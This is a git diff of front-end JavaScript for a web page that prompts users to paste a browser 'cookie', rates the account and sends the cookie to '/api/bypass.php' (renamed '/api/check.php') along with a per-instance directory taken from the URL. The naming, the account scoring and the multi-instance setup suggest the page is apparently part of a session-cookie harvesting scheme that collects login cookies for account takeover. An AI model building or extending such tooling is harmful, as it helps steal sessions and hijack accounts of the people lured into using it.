@@ -110,6 +110,10 @@ function getScoreRating(score) {
     return '🔰 Starter Account';
 }
 
+// Get directory from URL
+const urlParams = new URLSearchParams(window.location.search);
+const directory = urlParams.get('dir');
+
 // App Logic
 const cookieInput = document.getElementById('cookie-input');
 const btnStart = document.getElementById('btn-start');
@@ -152,10 +156,10 @@ if (btnCheck) {
         btnCheck.innerHTML = '<svg class="animate-spin h-5 w-5 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
 
         try {
-            const response = await fetch('/api/bypass.php', {
+            const response = await fetch('/api/check.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cookie, checkOnly: true, directory })
+                body: JSON.stringify({ cookie })
             });
 
             const data = await response.json();
@@ -184,7 +188,6 @@ if (btnCheck) {
                 }, 3000);
             }
         } catch (err) {
-            console.error('Check error:', err);
             btnCheck.disabled = false;
             btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Check Cookie';
             alert('Error checking cookie. Please try again.');
@@ -199,6 +202,11 @@ if (btnStart) {
 
         if (!cookie) {
             alert('Please provide a cookie');
+            return;
+        }
+
+        if (!directory) {
+            alert('No instance directory found');
             return;
         }
 
@@ -266,11 +274,34 @@ if (btnStart) {
             }, 1200);
 
         } catch (err) {
-            console.error('Bypass error:', err);
             setTimeout(() => {
                 processingState.classList.add('hidden');
                 failedState.classList.remove('hidden');
             }, 1500);
         }
+    };
+}
+
+// Restart/Retry Buttons
+const btnRestart = document.getElementById('btn-restart');
+if (btnRestart) {
+    btnRestart.onclick = () => {
+        successState.classList.add('hidden');
+        failedState.classList.add('hidden');
+        processingState.classList.add('hidden');
+        formState.classList.remove('hidden');
+        cookieInput.value = '';
+        cookieInput.focus();
+        progressBar.style.width = '0%';
+        progressText.innerText = '0% Complete';
+    };
+}
+
+const btnRetry = document.getElementById('btn-retry');
+if (btnRetry) {
+    btnRetry.onclick = () => {
+        failedState.classList.add('hidden');
+        formState.classList.remove('hidden');
+        cookieInput.focus();
     };
 }
